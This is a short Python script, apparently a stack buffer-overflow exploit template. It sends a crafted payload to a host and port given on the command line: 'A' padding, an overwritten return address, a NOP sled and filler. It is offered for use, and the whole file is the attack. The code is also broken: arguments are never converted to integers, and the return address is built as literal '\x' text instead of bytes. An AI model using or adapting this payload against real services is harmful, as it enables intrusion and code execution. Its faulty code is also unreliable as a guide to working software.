import socket
import time
import sys



if len(sys.argv) < 6:
    print("usage: \"python target.py [host] [port] [size] [eip] [return address]\"") 
    print("usage: make sure to set a breakpoint at the jump address!")
    exit(0)

host = sys.argv[1]
port = sys.argv[2]
size = sys.argv[3]
eip = sys.argv[4]
ret = sys.argv[5]
nop = 32

ret = ret.lower()
address = ""
for i in range(len(ret)-1,-1,-2):
    address += "\\x" + ret[i-1] + ret[i]

inputBuffer = "A" * size + address + "\x90" * nop + "C" * (size-eip-nop)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()




